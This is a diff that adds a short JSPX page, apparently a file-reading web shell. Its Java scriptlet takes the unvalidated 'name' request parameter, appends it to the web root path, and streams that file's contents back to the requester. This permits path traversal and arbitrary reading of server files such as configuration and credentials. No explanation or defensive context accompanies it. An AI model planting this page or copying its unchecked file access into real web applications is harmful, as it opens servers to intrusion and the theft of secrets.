@@ -1,0 +1,17 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="1.2">
+    <jsp:directive.page import="java.io.File"/>
+    <jsp:directive.page import="java.io.FileInputStream"/>
+    <pre>
+    <jsp:scriptlet>
+        File file = new File(request.getRealPath("/") + request.getParameter("name"));
+        FileInputStream in = new FileInputStream(file);
+        int tempbyte;
+
+        while ((tempbyte = in.read()) != -1) {
+            out.write(tempbyte);
+        }
+
+        in.close();
+    </jsp:scriptlet>
+    </pre>
+</jsp:root>
